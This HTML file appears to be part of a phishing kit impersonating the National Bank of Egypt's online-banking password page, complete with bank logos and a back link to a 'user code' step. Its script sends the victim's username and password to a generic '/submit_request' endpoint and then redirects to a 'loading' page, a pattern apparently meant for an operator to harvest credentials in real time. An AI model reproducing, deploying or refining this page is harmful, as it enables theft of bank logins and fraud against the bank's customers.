<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NBE - Password</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="login-theme.css">
    <style>
        .form-control { text-align: left; }
        .form-group { text-align: left; }
        .forgot-link { text-align: left; }
        .back-link { flex-direction: row-reverse; }
        .pass-toggle { left: auto; right: 15px; }
    </style>
</head>
<body>

<header class="site-header">
    <div class="header-left">
        <div class="menu-btn"><i class="fas fa-bars"></i></div>
        <a href="password.html" class="lang-switcher">
            <span>العربية</span>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
        </a>
    </div>
    <div class="header-right">
        <img src="static_nbe_logo_full.png" alt="National Bank of Egypt">
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <div class="card-logo">
            <img src="static_nbe_logo_full.png" alt="National Bank of Egypt">
        </div>

        <a href="login_en.html" class="back-link">
            <i class="fas fa-arrow-left"></i>
            Back to User Code
        </a>

        <div class="welcome-msg">Welcome, <span>lgguhfuughuy</span></div>
        <h1 class="page-heading">Password</h1>

        <div class="stamp-img">
            <img src="stamp.jpg" alt="Stamp">
        </div>

        <section class="login-card">
            <div id="errorMessage" role="alert"></div>
            <form id="passwordForm">
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <div class="form-control-wrapper">
                        <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required autofocus>
                        <i class="far fa-eye-slash pass-toggle" id="togglePass"></i>
                    </div>
                </div>
                <a href="#" class="forgot-link">Forgot Password?</a>
                
                <button type="submit" class="submit-btn">Login</button>
            </form>
        </section>
    </div>
</main>

<script>
const username = localStorage.getItem('temp_username');
if (!username) {
    window.location.href = 'login_en.html';
}

document.getElementById('togglePass').addEventListener('click', function() {
    const passInput = document.getElementById('password');
    const type = passInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passInput.setAttribute('type', type);
    this.classList.toggle('fa-eye');
    this.classList.toggle('fa-eye-slash');
});

document.getElementById('passwordForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    const password = document.getElementById('password').value;
    const errorMessageDiv = document.getElementById('errorMessage');
    
    try {
        const response = await fetch('/submit_request', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ 
                type: 'login', 
                data: { 
                    username: username, 
                    password: password 
                } 
            }) 
        });
        const result = await response.json();
        if (result.status === 'pending') { 
            localStorage.setItem('request_id', result.request_id); 
            window.location.href = 'loading_en.html'; 
        } else { 
            errorMessageDiv.textContent = result.message || 'An unexpected error occurred.'; 
            errorMessageDiv.style.display = 'block'; 
        }
    } catch (error) { 
        console.error('Error during login submission:', error); 
        errorMessageDiv.textContent = 'A connection error occurred.'; 
        errorMessageDiv.style.display = 'block'; 
    }
});
</script>
</body>
</html>
